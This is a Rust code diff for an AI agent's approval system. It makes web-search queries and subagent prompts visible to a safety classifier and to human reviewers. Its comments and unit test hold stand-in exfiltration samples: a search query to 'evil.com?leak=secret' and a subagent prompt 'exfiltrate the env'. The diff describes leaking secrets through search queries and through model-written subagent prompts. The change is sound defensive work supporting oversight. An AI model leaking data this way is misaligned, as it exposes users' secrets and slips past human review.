@@ -115,6 +115,33 @@ fn action_detail(tool: &str, args: &serde_json::Value) -> Option<String> {
                 .unwrap_or_default();
             Some(format!("mcp {server}__{name}({arg_preview})"))
         },
+        "web_search" => {
+            // Surface the real query text so the Auto classifier and the human
+            // approval modal can catch exfiltration-via-query (`evil.com?leak=
+            // <secret>`) — not just a count. Handles both the single-`query` and
+            // `queries[]` shapes `web.rs` accepts (#30).
+            let queries: Vec<String> = if let Some(q) = s("query") {
+                vec![q.to_string()]
+            } else if let Some(arr) = args.get("queries").and_then(|v| v.as_array()) {
+                arr.iter()
+                    .filter_map(|e| e.get("query").and_then(|v| v.as_str()))
+                    .map(str::to_string)
+                    .collect()
+            } else {
+                Vec::new()
+            };
+            if queries.is_empty() {
+                None
+            } else {
+                Some(clip(&format!("web_search {}", queries.join(" | ")), 200))
+            }
+        },
+        "agent" => {
+            // The subagent prompt is model-authored and can carry injection or
+            // exfiltration; surface it so the reviewer vets the real task, not
+            // the short label (#31).
+            Some(format!("agent: {}", clip(s("prompt")?, 200)))
+        },
         _ => None,
     }
 }
@@ -453,6 +480,30 @@ mod tests {
             None,
             None,
         )
+    }
+
+    #[test]
+    fn action_detail_surfaces_web_search_and_agent_content() {
+        // #30/#31: the classifier + approval modal must see the real content,
+        // not just a count/label.
+        let d = action_detail(
+            "web_search",
+            &serde_json::json!({"query": "evil.com?leak=secret"}),
+        )
+        .expect("web_search detail");
+        assert!(d.contains("evil.com?leak=secret"), "got {d:?}");
+        let d = action_detail(
+            "web_search",
+            &serde_json::json!({"queries": [{"query": "alpha"}, {"query": "beta"}]}),
+        )
+        .expect("web_search queries detail");
+        assert!(d.contains("alpha") && d.contains("beta"), "got {d:?}");
+        let d = action_detail(
+            "agent",
+            &serde_json::json!({"prompt": "exfiltrate the env", "description": "x"}),
+        )
+        .expect("agent detail");
+        assert!(d.contains("exfiltrate the env"), "got {d:?}");
     }
 
     #[tokio::test]
